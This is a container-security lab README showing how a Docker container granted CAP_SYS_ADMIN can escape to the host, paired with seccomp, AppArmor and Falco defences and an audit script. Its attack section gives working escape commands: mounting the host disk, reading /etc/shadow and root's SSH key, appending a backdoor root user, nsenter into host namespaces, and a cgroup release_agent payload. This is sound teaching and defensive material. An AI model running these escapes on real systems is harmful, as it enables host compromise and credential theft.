# Scenario 3: CAP_SYS_ADMIN - The "Not Privileged" Privilege Escalation

## Overview

This scenario demonstrates how the `CAP_SYS_ADMIN` capability provides nearly the same escape opportunities as `--privileged` mode, but is far more difficult to detect in security audits because it appears as a "single capability" rather than full privileged access.

**Attack Complexity:** Medium  
**Detection Difficulty:** Medium-High  
**Prevalence:** Common (monitoring agents, FUSE filesystems, VPN containers)  
**Impact:** Critical (full host filesystem access)

## Table of Contents

1. [Understanding CAP_SYS_ADMIN](#understanding-cap_sys_admin)
2. [Why Teams Add This Capability](#why-teams-add-this-capability)
3. [Attack Demonstrations](#attack-demonstrations)
4. [Defense Strategies](#defense-strategies)
5. [Hands-On Lab](#hands-on-lab)
6. [Detection and Monitoring](#detection-and-monitoring)

---

## Understanding CAP_SYS_ADMIN

### What is CAP_SYS_ADMIN?

`CAP_SYS_ADMIN` is a Linux capability that grants a wide range of system administration privileges. It's often called "the new root" because it enables so many powerful operations.

### Capabilities Granted by CAP_SYS_ADMIN

According to the Linux capabilities man page, `CAP_SYS_ADMIN` enables:

- **Mount/unmount filesystems** (including host filesystems)
- **Manipulate namespaces** (create, modify, enter)
- **Set disk quotas**
- **Perform privileged syslog operations**
- **Administer SCSI devices**
- **Perform VM86 operations**
- **Set hostname and domainname**
- **BPF program operations**
- **And 30+ other system operations**

### Normal Container vs CAP_SYS_ADMIN vs Privileged

```bash
# Check capabilities in different configurations

# Normal container (limited capabilities)
docker run --rm -it alpine sh -c "capsh --print | grep Current"
# Output: Current = cap_chown,cap_dac_override,cap_fowner,cap_fsetid,
#         cap_kill,cap_setgid,cap_setuid,cap_setpcap,
#         cap_net_bind_service,cap_net_raw,cap_sys_chroot,
#         cap_mknod,cap_audit_write,cap_setfcap=ep
# (14 capabilities)

# Container with CAP_SYS_ADMIN
docker run --rm -it --cap-add=SYS_ADMIN alpine sh -c "capsh --print | grep Current"
# Output: Adds cap_sys_admin=ep to above list
# (15 capabilities, but SYS_ADMIN is extremely powerful)

# Privileged container (all capabilities)
docker run --rm --privileged -it alpine sh -c "capsh --print | grep Current"
# Output: ALL 41 capabilities
```

### Why Security Audits Miss This

**What audits check:**
```bash
# Most security scanners look for:
docker inspect mycontainer | jq '.HostConfig.Privileged'
# Output: false ✅ (Passes audit)
```

**What audits should check:**
```bash
# But miss checking:
docker inspect mycontainer | jq '.HostConfig.CapAdd'
# Output: ["SYS_ADMIN"] 🚨 (Critical finding)
```

**The illusion:**
- Not privileged = ✅ Safe
- Only one capability = ✅ Safe
- Reality = 🚨 Nearly as dangerous as privileged

---

## Why Teams Add This Capability

### Legitimate Use Cases

#### 1. FUSE Filesystems
```bash
# S3 filesystem mounts (s3fs-fuse)
docker run \
  --cap-add=SYS_ADMIN \
  --device=/dev/fuse \
  s3fs-fuse:latest \
  s3fs mybucket /mnt/s3
```

**Developer reasoning:** "We need to mount S3 as a filesystem"

#### 2. VPN Containers
```bash
# OpenVPN container
docker run \
  --cap-add=SYS_ADMIN \
  --cap-add=NET_ADMIN \
  --device=/dev/net/tun \
  openvpn:latest
```

**Developer reasoning:** "OpenVPN documentation says to add this"

#### 3. Monitoring Agents
```bash
# System monitoring
docker run \
  --cap-add=SYS_ADMIN \
  -v /proc:/host/proc:ro \
  -v /sys:/host/sys:ro \
  monitoring-agent:latest
```

**Developer reasoning:** "Need deep system visibility"

#### 4. Build Containers
```bash
# Container build systems
docker run \
  --cap-add=SYS_ADMIN \
  builder:latest \
  build --output /app/dist
```

**Developer reasoning:** "Build failed without it"

### The Problem

In most cases, **CAP_SYS_ADMIN is not actually necessary**. There are safer alternatives:

- FUSE → Mount on host, share as volume (no capabilities needed)
- VPN → Just NET_ADMIN (not SYS_ADMIN)
- Monitoring → Specific capabilities + host-mounted /proc
- Builds → Rootless builders (Kaniko, Buildah)

But once added, it's rarely removed or reviewed.

---

## Attack Demonstrations

### Prerequisites

```bash
# Ensure you're in the scenario directory
cd labs/09-runtime-escape/scenario-3-sys-admin

# Make scripts executable
chmod +x *.sh
```

### Attack 1: Direct Host Filesystem Mount

**Scenario:** Container with CAP_SYS_ADMIN can mount the host's root filesystem.

**Setup:**
```bash
# Start container with CAP_SYS_ADMIN
docker run -dit \
  --name sys-admin-escape \
  --cap-add=SYS_ADMIN \
  alpine sh
```

**Attack:**
```bash
# Enter the container
docker exec -it sys-admin-escape sh

# Inside container:
# Step 1: Find host block devices
ls -l /dev/ | grep -E "sd|vd|nvme"
# Output shows host devices:
# brw-rw---- 1 root disk 8, 0 Jan 28 10:00 sda
# brw-rw---- 1 root disk 8, 1 Jan 28 10:00 sda1

# Step 2: Create mount point
mkdir /host

# Step 3: Mount host filesystem
mount /dev/sda1 /host

# Step 4: Verify we have host access
ls -la /host/
# Output: Host root filesystem!
# drwxr-xr-x  20 root root  4096 Jan 28 10:00 .
# drwxr-xr-x   3 root root  4096 Jan 28 10:01 ..
# drwxr-xr-x   2 root root  4096 Oct  1 10:00 bin
# drwxr-xr-x   4 root root  4096 Oct  1 10:00 boot
# drwxr-xr-x 130 root root 12288 Jan 28 10:00 etc
# drwxr-xr-x   3 root root  4096 Oct  1 10:00 home
# drwxr-xr-x  20 root root  4096 Oct  1 10:00 root
# ...

# Step 5: Read sensitive files
cat /host/etc/shadow
# Output: HOST password hashes!

cat /host/root/.ssh/id_rsa
# Output: HOST SSH private key!

# Step 6: Modify host system
echo "attacker:x:0:0:root:/root:/bin/bash" >> /host/etc/passwd
# Backdoor user created on HOST!
```

**Cleanup:**
```bash
# Exit container
exit

# Stop and remove
docker stop sys-admin-escape
docker rm sys-admin-escape
```

---

### Attack 2: Namespace Manipulation

**Scenario:** Use CAP_SYS_ADMIN to escape container namespaces.

**Setup:**
```bash
# Start container with SYS_ADMIN
docker run -dit \
  --name namespace-escape \
  --cap-add=SYS_ADMIN \
  alpine sh
```

**Attack:**
```bash
docker exec -it namespace-escape sh

# Inside container:
# Step 1: Install required tools
apk add --no-cache util-linux

# Step 2: List namespaces
ls -la /proc/self/ns/
# Output shows container's namespaces:
# lrwxrwxrwx 1 root root 0 Jan 28 10:00 mnt -> mnt:[4026532508]
# lrwxrwxrwx 1 root root 0 Jan 28 10:00 net -> net:[4026532510]
# lrwxrwxrwx 1 root root 0 Jan 28 10:00 pid -> pid:[4026532509]

# Step 3: Enter host mount namespace
nsenter --target 1 --mount --uts --ipc --net --pid

# Now you're in host namespaces!
# Verify:
ps aux | head -5
# Output shows HOST processes, not just container!

hostname
# Output: HOST hostname!

# Can now access host filesystem directly
ls /
# This is the HOST root filesystem!
```

**Cleanup:**
```bash
exit
docker stop namespace-escape
docker rm namespace-escape
```

---

### Attack 3: Cgroup Manipulation for Code Execution

**Scenario:** Classic Felix Wilhelm container escape technique using cgroups.

**Setup:**
```bash
# Start container with SYS_ADMIN
docker run -dit \
  --name cgroup-escape \
  --cap-add=SYS_ADMIN \
  alpine sh
```

**Attack:**
```bash
docker exec -it cgroup-escape sh

# Inside container:
# This is the famous 2019 container escape

# Step 1: Create a cgroup and mount it
mkdir /tmp/cgrp
mount -t cgroup -o memory cgroup /tmp/cgrp

# Step 2: Set up release_agent (runs on host when cgroup exits)
echo 1 > /tmp/cgrp/notify_on_release

# Step 3: Find host filesystem path
host_path=$(sed -n 's/.*\perdir=\([^,]*\).*/\1/p' /etc/mtab)
echo "Host path: $host_path"

# Step 4: Create payload that runs on HOST
cat > /cmd.sh << 'EOF'
#!/bin/sh
# This script will run on the HOST, not in container!
# Proof: steal /etc/shadow
cat /etc/shadow > /tmp/shadow-stolen
chmod 644 /tmp/shadow-stolen
EOF

chmod +x /cmd.sh

# Step 5: Set release_agent to our payload
echo "$host_path/cmd.sh" > /tmp/cgrp/release_agent

# Step 6: Trigger the escape
sh -c "echo \$\$ > /tmp/cgrp/cgroup.procs"

# The cgroup exits, release_agent executes on HOST!
# Wait a moment, then check:
sleep 2

# Verify - the file was created on HOST
ls -la /tmp/shadow-stolen 2>/dev/null && cat /tmp/shadow-stolen
```

**Cleanup:**
```bash
exit
docker stop cgroup-escape
docker rm cgroup-escape
# Clean up host artifacts
sudo rm -f /tmp/shadow-stolen
```

---

## Defense Strategies

### Defense 1: Secure Docker Compose Configuration

**Best practice:** Drop all capabilities by default, add only what is absolutely necessary. Never use `--cap-add=SYS_ADMIN` unless you have exhausted all alternatives.

```yaml
# File: artifacts/docker-compose-secure.yml
version: '3.8'

services:
  secure-app:
    image: myapp:latest

    # Drop ALL capabilities by default
    cap_drop:
      - ALL

    # Add only specific safe capabilities
    cap_add:
      - NET_BIND_SERVICE
      # Note: SYS_ADMIN is NOT included!

    # Security options
    security_opt:
      - no-new-privileges:true

    # Run as non-root user
    user: "1000:1000"

    # Read-only root filesystem
    read_only: true

    # Writable tmp only
    tmpfs:
      - /tmp:noexec,nosuid,size=64m
```

**Test it:**
```bash
# Run with secure configuration - should work normally
docker run --rm \
  --cap-drop=ALL \
  --cap-add=NET_BIND_SERVICE \
  --security-opt no-new-privileges=true \
  --read-only \
  --user 1000:1000 \
  alpine echo "secure container works"
```

---

### Defense 2: Seccomp Profile

Block the dangerous syscalls that CAP_SYS_ADMIN enables at the kernel level. Even if a container somehow gains SYS_ADMIN, the seccomp profile prevents the actual syscalls from executing.

```json
// File: artifacts/seccomp-no-sys-admin.json
{
  "defaultAction": "SCMP_ACT_ALLOW",
  "architectures": ["SCMP_ARCH_X86_64", "SCMP_ARCH_X86", "SCMP_ARCH_AARCH64"],
  "syscalls": [
    {
      "names": ["mount", "umount", "umount2", "pivot_root"],
      "action": "SCMP_ACT_ERRNO",
      "comment": "Block filesystem mount/unmount - prevents host filesystem access"
    },
    {
      "names": ["unshare", "clone", "setns"],
      "action": "SCMP_ACT_ERRNO",
      "comment": "Block namespace manipulation - prevents namespace escape"
    },
    {
      "names": ["bpf", "perf_event_open", "quotactl"],
      "action": "SCMP_ACT_ERRNO",
      "comment": "Block additional privileged operations"
    }
  ]
}
```

**Test it:**
```bash
# Apply seccomp profile - mount should be blocked on Linux
docker run --rm \
  --cap-add=SYS_ADMIN \
  --security-opt seccomp=artifacts/seccomp-no-sys-admin.json \
  alpine mount
# On Linux: "mount: permission denied" - seccomp blocked it
# On Docker Desktop (Mac): seccomp enforcement is limited
```

---

### Defense 3: AppArmor Profile (Linux)

AppArmor provides a second layer of defense at the LSM (Linux Security Module) level, denying dangerous operations regardless of capabilities.

```
# File: artifacts/docker-no-sys-admin-apparmor
#include <tunables/global>

profile docker-no-sys-admin flags=(attach_disconnected,mediate_deleted) {
  #include <abstractions/base>

  # Deny all mount operations
  deny mount,
  deny umount,
  deny pivot_root,

  # Deny namespace manipulation
  deny /proc/sys/kernel/** w,
  deny /sys/kernel/** w,

  # Deny cgroup manipulation (blocks release_agent escape)
  deny /sys/fs/cgroup/** w,

  # Deny access to host block devices
  deny /dev/sd* rw,
  deny /dev/vd* rw,
  deny /dev/nvme* rw,

  # Explicitly deny the capability itself
  deny capability sys_admin,

  # Allow normal container operations
  network inet tcp,
  network inet udp,
  capability setgid,
  capability setuid,
  capability net_bind_service,
}
```

**Deploy it (requires root on Linux):**
```bash
# Install the profile
sudo cp artifacts/docker-no-sys-admin-apparmor /etc/apparmor.d/
sudo apparmor_parser -r /etc/apparmor.d/docker-no-sys-admin-apparmor

# Use it
docker run --rm \
  --cap-add=SYS_ADMIN \
  --security-opt apparmor=docker-no-sys-admin \
  alpine mount
# Output: "mount: permission denied" - AppArmor blocked it
```

---

### Defense 4: Runtime Monitoring with Falco

Detect when CAP_SYS_ADMIN is being abused in real time. Falco watches syscalls and alerts on suspicious patterns.

```yaml
# File: artifacts/falco-docker-sys-admin-rules.yaml

# Rule 1: Detect mount operations in containers with SYS_ADMIN
- rule: Container Mount Operation Detected
  desc: Detect filesystem mount in container - possible SYS_ADMIN abuse
  condition: >
    spawned_process and
    container and
    proc.name = mount and
    not proc.pname in (docker, containerd, dockerd)
  output: >
    Mount operation detected in container
    (user=%user.name container_id=%container.id container_name=%container.name
    image=%container.image.repository command=%proc.cmdline)
  priority: WARNING
  tags: [container, filesystem, sys_admin]

# Rule 2: Detect nsenter (namespace manipulation)
- rule: Container Namespace Manipulation
  desc: Detect nsenter or unshare indicating namespace escape attempt
  condition: >
    spawned_process and
    container and
    proc.name in (nsenter, unshare)
  output: >
    Namespace manipulation detected in container
    (user=%user.name container_id=%container.id container_name=%container.name
    command=%proc.cmdline)
  priority: CRITICAL
  tags: [container, namespace, escape, sys_admin]

# Rule 3: Detect cgroup release_agent modification
- rule: Cgroup Release Agent Modification
  desc: Detect modification of cgroup release_agent - classic escape technique
  condition: >
    open_write and
    container and
    fd.name contains "release_agent" and
    fd.name startswith /sys/fs/cgroup
  output: >
    Cgroup release_agent modification detected - possible escape attempt
    (user=%user.name container_id=%container.id container_name=%container.name
    file=%fd.name command=%proc.cmdline)
  priority: CRITICAL
  tags: [container, cgroup, escape, sys_admin]

# Rule 4: Detect access to host block devices
- rule: Container Accessing Host Block Devices
  desc: Detect when container accesses host block devices
  condition: >
    open and
    container and
    fd.name startswith /dev/ and
    fd.name pmatch (/dev/sd*, /dev/vd*, /dev/nvme*)
  output: >
    Container accessing host block device
    (user=%user.name container_id=%container.id container_name=%container.name
    device=%fd.name command=%proc.cmdline)
  priority: WARNING
  tags: [container, device, sys_admin]
```

**Deploy Falco (Linux only):**
```bash
# Install Falco
curl -s https://falco.org/script/install | sudo bash

# Copy rules
sudo cp artifacts/falco-docker-sys-admin-rules.yaml /etc/falco/rules.d/

# Restart to load rules
sudo systemctl restart falco

# Test - trigger an alert
docker run --cap-add=SYS_ADMIN alpine mount

# Check alerts
sudo journalctl -u falco -f | grep "Mount operation"
```

---

### Defense 5: Use Alternative Solutions

Before resorting to SYS_ADMIN, evaluate these safer alternatives:

#### For FUSE Filesystems → Mount on Host, Share as Volume

```bash
# OLD (insecure): FUSE mount inside container with SYS_ADMIN
docker run --cap-add=SYS_ADMIN --device=/dev/fuse s3fs:latest

# NEW (secure): Mount on host, share as read-only volume
s3fs mybucket /mnt/s3 -o allow_other
docker run -v /mnt/s3:/data:ro myapp
# No capabilities needed inside container
```

#### For VPN → Use Only NET_ADMIN

```bash
# OLD (insecure): SYS_ADMIN + NET_ADMIN
docker run --cap-add=SYS_ADMIN --cap-add=NET_ADMIN openvpn:latest

# NEW (secure): NET_ADMIN is sufficient for most VPN operations
docker run \
  --cap-drop=ALL \
  --cap-add=NET_ADMIN \
  --device=/dev/net/tun \
  openvpn:latest
```

#### For System Monitoring → Use Specific Capabilities

```bash
# OLD (insecure): SYS_ADMIN for "full system visibility"
docker run --cap-add=SYS_ADMIN -v /proc:/host/proc monitoring:latest

# NEW (secure): Specific capabilities + read-only host mounts
docker run \
  --cap-drop=ALL \
  --cap-add=DAC_READ_SEARCH \
  -v /proc:/host/proc:ro \
  -v /var/log:/host/logs:ro \
  monitoring:latest
# DAC_READ_SEARCH allows reading files without execute permission
```

#### For Build Containers → Use Rootless Builders

```bash
# OLD (insecure): Docker-in-Docker with SYS_ADMIN
docker run --cap-add=SYS_ADMIN docker:dind

# NEW (secure): Rootless builders that need no special capabilities
# Kaniko - runs without any elevated privileges
docker run \
  --cap-drop=ALL \
  -v /path/to/Dockerfile:/workspace/Dockerfile \
  gcr.io/kaniko-project/executor:latest \
  --dockerfile=/workspace/Dockerfile \
  --destination=myregistry/myapp:latest

# Buildah - supports rootless operation
docker run \
  --cap-drop=ALL \
  --security-opt seccomp=unconfined \
  quay.io/containers/buildah:latest \
  buildah build -t myapp .
```

---

## Hands-On Lab

### Quick Start

Run the automated demonstration and defense workflow:

```bash
# 1. Watch the attacks
./demo.sh

# 2. Deploy all defenses
./defense.sh
# Select option 1 (Deploy all defenses)

# 3. Validate everything works
./validate.sh

# 4. Clean up demo containers
./cleanup.sh
```

### Manual Step-by-Step

#### Step 1: Understand Capability Differences

```bash
# Compare capabilities across container types
echo "=== Normal Container ==="
docker run --rm alpine sh -c "cat /proc/self/status | grep Cap"

echo -e "\n=== Container with SYS_ADMIN ==="
docker run --rm --cap-add=SYS_ADMIN alpine sh -c "cat /proc/self/status | grep Cap"

echo -e "\n=== Privileged Container ==="
docker run --rm --privileged alpine sh -c "cat /proc/self/status | grep Cap"
```

#### Step 2: Attempt Escape

```bash
# Try each attack from the demonstrations above
# Follow Attack 1, 2, or 3 step-by-step
# Or run the automated demo:
./demo.sh
```

#### Step 3: Implement Defenses

```bash
# Deploy all Docker-native defenses
./defense.sh
# Option 1 deploys: Docker Compose template, Seccomp, AppArmor, Falco rules, and audit script

# Or deploy individually:
./defense.sh   # Option 3 - Seccomp profile only
./defense.sh   # Option 4 - AppArmor profile only
./defense.sh   # Option 5 - Audit running containers
```

#### Step 4: Monitor for Abuse

```bash
# Run the audit script to scan for SYS_ADMIN containers
./artifacts/audit-sys-admin.sh

# Deploy Falco on Linux for real-time monitoring (see Defense 4 above)
# Then trigger an alert in a second terminal:
docker run --cap-add=SYS_ADMIN alpine mount

# Check Falco alerts
sudo journalctl -u falco -f | grep "Mount operation"
```

#### Step 5: Cleanup

```bash
./cleanup.sh
# Removes containers + generated artifacts. Preserves only audit-sys-admin.sh
```

---

## Detection and Monitoring

### Audit Script: Find CAP_SYS_ADMIN Containers

The audit script scans all running Docker containers for CAP_SYS_ADMIN:

```bash
# Run the audit
chmod +x artifacts/audit-sys-admin.sh
./artifacts/audit-sys-admin.sh
```

**What it checks:**
```bash
# For each running container, inspect:
docker inspect --format='{{.HostConfig.Privileged}}' <container>  # Privileged flag
docker inspect --format='{{.HostConfig.CapAdd}}' <container>      # Added capabilities

# Flags containers where:
#   Privileged = true          → CRITICAL risk
#   CapAdd contains SYS_ADMIN → HIGH risk (near-privileged)
```

**Sample output:**
```
========================================
CAP_SYS_ADMIN Capability Audit (Docker)
========================================
Scanning Docker host: production-server
Timestamp: Fri Jan 31 14:22:00 UTC 2025

🚨 FOUND: myapp (ID: a1b2c3d4e5f6) - Has CAP_SYS_ADMIN
  Image: myregistry/myapp:latest
  Risk: HIGH - Near-privileged access

========================================
Audit Summary
========================================
Total containers scanned: 12
Privileged containers:    0
Near-privileged (SYS_ADMIN): 1

⚠️  Found 1 container(s) with dangerous access
```

### Continuous Monitoring

**Set up alerts for:**
1. New containers started with CAP_SYS_ADMIN (Falco rule)
2. Mount operations inside containers (Falco rule)
3. Namespace manipulation attempts (Falco rule)
4. Cgroup release_agent modifications (Falco rule)
5. Access to host block devices (Falco rule)

**Integrating Falco alerts with external systems:**
```bash
# Falco supports HTTP output for webhook-based alerting
# Configure in /etc/falco/falco.yaml:
#
# json_output: true
# http_output:
#   enabled: true
#   url: "https://hooks.slack.com/services/YOUR/WEBHOOK/URL"
#
# This sends CRITICAL alerts directly to Slack
```

---

## Summary

### Key Takeaways

1. **CAP_SYS_ADMIN ≈ Privileged**
   - Provides nearly the same escape capabilities
   - Much harder to detect in audits
   - More commonly allowed than --privileged

2. **Common Misconceptions**
   - "It's just one capability" → False, it enables 30+ operations
   - "Not privileged = safe" → False, SYS_ADMIN is nearly as powerful
   - "We need it for FUSE" → False, mount on host and share as volume

3. **Defense Priority**
   - Default: Drop ALL capabilities
   - Add: Only specific safe capabilities (NET_BIND_SERVICE, NET_ADMIN, etc.)
   - Never: Add SYS_ADMIN unless absolutely proven necessary
   - Alternative: Use host mounts, specific caps, or rootless builders

4. **Detection is Critical**
   - Audit existing containers regularly
   - Apply seccomp profiles to block dangerous syscalls
   - Use AppArmor/SELinux as a second enforcement layer
   - Monitor at runtime with Falco

### Production Checklist

- [ ] Audit current containers for CAP_SYS_ADMIN (`./artifacts/audit-sys-admin.sh`)
- [ ] Apply seccomp profiles to all containers (`artifacts/seccomp-no-sys-admin.json`)
- [ ] Deploy AppArmor profiles on Linux hosts (`artifacts/docker-no-sys-admin-apparmor`)
- [ ] Replace FUSE mounts with host-mounted volumes where possible
- [ ] Use only NET_ADMIN for VPN containers
- [ ] Switch to rootless builders (Kaniko, Buildah) for CI/CD
- [ ] Deploy Falco rules for runtime detection (`artifacts/falco-docker-sys-admin-rules.yaml`)
- [ ] Set up Falco HTTP output for alerting
- [ ] Document any exceptions (if SYS_ADMIN is truly needed)
- [ ] Regular re-audits (monthly)

---

## References

- [Linux Capabilities Man Page](https://man7.org/linux/man-pages/man7/capabilities.7.html)
- [Felix Wilhelm Container Escape (2019)](https://blog.trailofbits.com/2019/07/19/understanding-docker-container-escapes/)
- [Docker Security Best Practices](https://docs.docker.com/engine/security/)
- [Docker Seccomp Documentation](https://docs.docker.com/engine/security/seccomp/)
- [Docker AppArmor Documentation](https://docs.docker.com/engine/security/apparmor/)
- [Falco Project](https://falco.org/)
- [CNCF Cloud Native Security Whitepaper](https://www.cncf.io/wp-content/uploads/2020/11/CNCF_Cloud_Native_Security_Whitepaper_Nov_2020.pdf)

---

## Lab Files

```
scenario-3-sys-admin/
├── demo.sh                                    # Automated attack demonstrations
├── defense.sh                                 # Defense implementation (creates all artifacts)
├── validate.sh                                # Validates all defenses are working
├── cleanup.sh                                 # Remove containers
└── artifacts/                                 # Created by defense.sh
    ├── audit-sys-admin.sh                     # Docker container audit script
    ├── docker-compose-secure.yml              # Secure compose template (cap_drop: ALL)
    ├── seccomp-no-sys-admin.json              # Seccomp profile blocking mount/namespace syscalls
    ├── docker-no-sys-admin-apparmor           # AppArmor profile denying dangerous operations
    └── falco-docker-sys-admin-rules.yaml      # Falco runtime detection rules
```

---

**Next Scenario:** [Scenario 4: Host Path Mounts](../scenario-4-host-mount/)  
**Previous Scenario:** [Scenario 2: Privileged Mode](../scenario-2-privileged/)  
**Main Lab:** [Lab 09: Runtime Escape](../)